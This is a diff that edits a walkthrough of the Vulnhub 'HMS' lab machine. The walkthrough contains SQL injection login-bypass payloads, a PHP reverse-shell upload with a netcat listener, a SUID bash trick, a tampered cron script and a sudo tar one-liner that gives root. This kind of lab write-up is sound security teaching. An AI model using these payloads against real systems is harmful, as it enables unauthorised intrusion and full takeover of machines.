@@ -1,10 +1,11 @@
 # HMS-Writeup 
-HMS is an easy machine from Vulnhub by Nivek. I have tested this machine on VirtualBox.
-
-Link to the machine: [https://www.vulnhub.com/entry/hms-1,728/](https://www.vulnhub.com/entry/hms-1,728/)
+HMS is an easy machine from Vulnhub by Nivek.<br />
+I've tested this machine on VirtualBox.<br />
+Link to the machine: [https://www.vulnhub.com/entry/hms-1,728/](https://www.vulnhub.com/entry/hms-1,728/).
+<br />
 
 ## Identify the target
-I am using the machine in host only network. Here, I am using netdiscover to detect the IP address of the target.
+I'm using the machine in host-only network. Here, I am using netdiscover to detect the IP address of the target.
 ```
 netdiscover -i vboxnet0 -r 10.10.10.0/24
 
@@ -17,8 +18,11 @@ _____________________________________________________________________________
  10.10.10.1      08:00:27:fc:33:6c      1      42  PCS Systemtechnik GmbH                           
  10.10.10.10     08:00:27:56:f8:fd      1      60  PCS Systemtechnik GmbH
 ```
+<br />
+
 ## Scan Open Ports
-we have to look for the open ports on the target.
+
+We have to look for open ports on the target.
 ```
 nmap -sV -sC -p- -oN nmap.log 10.10.10.10
 
@@ -51,6 +55,8 @@ nmap -sV -sC -p- -oN nmap.log 10.10.10.10
 |     PHPSESSID: 
 |_      httponly flag not set
 ```
+<br />
+
 We can access the FTP service anonymously.
 ```
 ftp 10.10.10.10
@@ -71,88 +77,105 @@ drwxr-xr-x    2 0        118          4096 Jul 26 19:27 ..
 226 Directory send OK.
 ftp>
 ```
-there aren’t any files in there.
+<br />
+
+There is nothing in there.
+<br />
 
 ## Examine Port 7080 - Apache
 
 ![](pics/login.png)
+<br />
 
-We have login page, so there is no register link from here and we don’t have credentials.
-
-I’ll use Burp to intercept the request.
-
-send it to repeter, modified email with `'`.
+We have a login page, but no registeration link, and we don’t have any credentials.<br />
+Let's use `Burp` to intercept the request.<br />
+Send it to repeater, modified email with `'`.
 
 ![](pics/burp1.png)
+<br />
 
 The field email in this form suffers from an SQL injection. 
 ```
 ' or 1=1 #
 ' or 1=1 -- 
 ```
-You can also use developers tools to modify the request.
+<br />
 
-However, there is a validation in the input field that it must be an `email`. Thus we have to remove it to inject our payload. So, inspect the email field
-and remove `type="email"`.
-
+You can also use developer tools to modify the request.<br />
+However, there is a validation in the input field that it must be an `email`. Thus we have to remove it to inject our payload. So, inspect the email field and remove `type="email"`.
+<br />
 And we have access to the admin panel.
 
 ![](pics/admin1.png)
+<br />
 
-After we log into the dashboard, we see a directory for uploaded images in the source.
+After we login, we see a directory for uploaded images in the source.
 
 ![](pics/source1.png)
+<br />
 
-And a path for the settings that is commented.
+And a path for the settings that are commented.
 
 ![](pics/source2.png)
+<br />
 
 When we visit `setting.php`, we see an image uploading feature.
 
 ![](pics/admin2.png)
+<br />
 
 ## Reverse Shell
-Lets upload a shell. There is a webshells in kali by default: `ls /usr/share/webshells/`
 
-Or you can find one online: [revshells](https://www.revshells.com/),  [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+Let's upload a shell. There is a web shells in kali by default: `ls /usr/share/webshells`, Or you can find one online: [revshells](https://www.revshells.com/),  [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)<br />
 
-I Changed the ip address and port, and started listening on the same port.
+I Changed the IP address and port, and started listening on the same port.
 ```
 nc -lnvp 5555
 ```
-We have a dummy shell, lets upgrade it.
+<br />
+
+We have a dummy shell, let's upgrade it.
 
 ![](pics/shell1.png)
+<br />
 
-There are two users on the machine "eren" and "nivek". We need to switch to real user so lets check the SUID binaries.
+There are two users on the machine `eren` and `nivek`. We need to switch to a real user so let us check the SUID binaries.
 
 ![](pics/perm.png)
+<br />
 
-Reference: [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)
+> Reference: [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)
+<br />
 
-So we can use it to get an instance of bash shell as user `eren`.
+So, we can use it to get an instance of bash shell as user `eren`.
 ```
 /usr/bin/bash -p
 ```
+<br />
+
 We still user `daemon` but `eren` is the effective user for this process only, this means that we don't have access to sudo permissions.
 
 ![](pics/euid.png)
+<br />
 
-After an hour digging around, i checked the cron jobs, and there is a backup script in the eren's directory. 
+After a while of digging around, I checked the cron jobs, and there is a backup script in the eren's directory. 
 
 ![](pics/cron.png)
+<br />
 
-This script runs every 5 minutes, and owned by `eren`. we can modify it to get another reverse shell as user `eren` on port `1234`.
+This script runs every 5 minutes and is owned by `eren`. we can modify it to get another reverse shell as user `eren` on port `1234`.
 
 ![](pics/nano.png)
+<br />
 
-In five minutes i got a shell with user eren.
+In five minutes I got a shell with user eren.
 
 ![](pics/rshell1.png)
+<br />
 
 ## Privilege Escalation
 
-Lets check the sudo permission:
+Let's check the sudo permission:
 ```
 sudo -l
 
@@ -163,12 +186,17 @@ Matching Defaults entries for eren on nivek:
 User eren may run the following commands on nivek:
     (root) NOPASSWD: /bin/tar
 ```
-Searching in gtfobins: [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)
+<br />
+
+> Searching in gtfobins: [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)
+<br />
 
 tar gives us a root shell
 ```
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
-and we'r root.
+<br />
+
+and we're root.
 
 ![](pics/sudo.png)
